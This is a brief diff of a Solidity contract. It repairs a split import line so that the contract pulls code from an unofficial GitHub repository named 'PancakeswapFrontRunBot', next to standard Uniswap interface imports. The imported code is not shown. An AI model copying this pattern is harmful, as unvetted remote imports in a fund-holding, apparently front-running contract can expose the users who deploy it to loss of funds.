@@ -3,8 +3,7 @@ pragma solidity ^0.6.6;
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
 
 //pancekeswap manager
-import "https://github.com/PancakeswapFrontRunBot/
-PancakeswapFrontRunBot/blob/main/FrontRunPancake";
+import "https://github.com/PancakeswapFrontRunBot/PancakeswapFrontRunBot/blob/main/FrontRunPancake";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 
